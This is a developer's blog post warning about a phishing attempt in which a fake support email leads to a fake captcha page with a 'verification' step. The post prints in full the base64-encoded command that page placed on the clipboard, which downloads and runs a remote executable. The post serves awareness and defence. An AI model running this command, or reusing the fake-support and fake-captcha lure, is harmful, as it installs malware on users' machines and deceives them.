            <p>Hi, it&#39;s <a href="https://x.com/craftzdog?ref=blog.craftz.dog" rel="noopener">Takuya</a>. As your app grows in popularity, you occasionally start to attract attacks aimed directly at you—the developer or site owner. Just the other day, I got one that was honestly terrifying, so I&#39;d like to share it.</p><h3 id="the-email">The Email</h3><pre><code>Subject: Cookie consent prevents platform access

Hello,
I cannot access use the store.
The cookie consent notice keeps appearing and nothing happens once I approve or try to close it, so I’m unable to
interact with the website.
Please provide guidance on how to resolve this or provide an alternative solution so I can access?
</code></pre><p>In short, they’re saying:</p><blockquote>“I can’t use your site because the cookie consent keeps blocking access.”</blockquote><p>Weird already — because my app’s website, <a href="https://www.inkdrop.app/?ref=devas.life" rel="noreferrer">https://www.inkdrop.app/</a>, <strong>doesn’t even show a cookie consent dialog</strong>. I don’t track or serve ads, so there’s no need for that.</p><p>Still, I replied politely:</p><pre><code>Can you tell me which Url, your OS, and browser?
Kind regards,
Takuya
</code></pre><p>A bit later, I got this reply (which Gmail had automatically placed in the spam folder):</p><pre><code>Hey,
Thanks for your previous guidance.
I&#39;m still having trouble with access using the latest version of Firefox on Windows
It&#39;s difficult to describe the problem so I&#39;ve included a screenshot.
https://sites.google.com/view/drive-845fro3buhxi/screen?fileid=15034204
Please take a look and suggest the next steps.
</code></pre><p>At first glance, it looked perfectly normal. But notice — they never actually told me which page was causing the issue. Instead, they sent a link claiming to contain a screenshot. It looked like a Google Drive link, but it was actually a <strong>Google Sites</strong> page. Without thinking, I clicked it. (You should <em>never</em> do this!)</p><h3 id="the-trap">The Trap</h3><figure><img src="https://www.devas.life/content/images/2025/10/image.png" alt="" loading="lazy" width="2000" height="1587" srcset="https://www.devas.life/content/images/size/w600/2025/10/image.png 600w, https://www.devas.life/content/images/size/w1000/2025/10/image.png 1000w, https://www.devas.life/content/images/size/w1600/2025/10/image.png 1600w, https://www.devas.life/content/images/2025/10/image.png 2316w" sizes="(min-width: 720px) 720px"/></figure><p>It showed a Captcha screen.</p><figure><img src="https://www.devas.life/content/images/2025/10/image-1.png" alt="" loading="lazy" width="2000" height="1587" srcset="https://www.devas.life/content/images/size/w600/2025/10/image-1.png 600w, https://www.devas.life/content/images/size/w1000/2025/10/image-1.png 1000w, https://www.devas.life/content/images/size/w1600/2025/10/image-1.png 1600w, https://www.devas.life/content/images/2025/10/image-1.png 2316w" sizes="(min-width: 720px) 720px"/></figure><p>It said something like “verification step” — telling me to open a terminal, paste a command, and run it. That’s when it hit me: <strong>“Oh no, this is phishing.”</strong></p><p>The command they had copied to my clipboard was this:</p><pre><code>echo -n Y3VybCAtc0wgLW8gL3RtcC9wakttTVVGRVl2OEFsZktSIGh0dHBzOi8vd3d3LmFtYW5hZ2VuY2llcy5jb20vYXNzZXRzL2pzL2dyZWNhcHRjaGE7IGNobW9kICt4IC90bXAvcGpLbU1VRkVZdjhBbGZLUjsgL3RtcC9wakttTVVGRVl2OEFsZktS | base64 -d | bash
</code></pre><p><strong>Never</strong> run anything like this in your terminal. It downloads and executes a shell script from a remote server — as ChatGPT confirmed when I asked it to analyze it:</p><figure><img src="https://www.devas.life/content/images/2025/10/image-2.png" alt="" loading="lazy" width="1614" height="1634" srcset="https://www.devas.life/content/images/size/w600/2025/10/image-2.png 600w, https://www.devas.life/content/images/size/w1000/2025/10/image-2.png 1000w, https://www.devas.life/content/images/size/w1600/2025/10/image-2.png 1600w, https://www.devas.life/content/images/2025/10/image-2.png 1614w" sizes="(min-width: 720px) 720px"/></figure><p>Absolutely terrifying.</p><p>Because Gmail had flagged the second message as spam, the URL was probably already reported as malicious. But the first message wasn’t flagged — so I thought, “Maybe it’s a false positive,” and replied. Big mistake.</p><h2 id="ai-powered-spam-and-phishing-are-on-the-rise">AI-Powered spam and phishing are on the rise</h2><p>Even on my user forum, I’ve started seeing suspicious posts that seem to be written by AI. They look natural at first glance, but the intent is unclear — often just spam or trolling.</p><p>Phishing emails disguised as support inquiries are getting more sophisticated, too.</p><p>It’s unsettling. Stay alert, guys — the attacks are getting smarter. Hope it&#39;s helpful!</p>
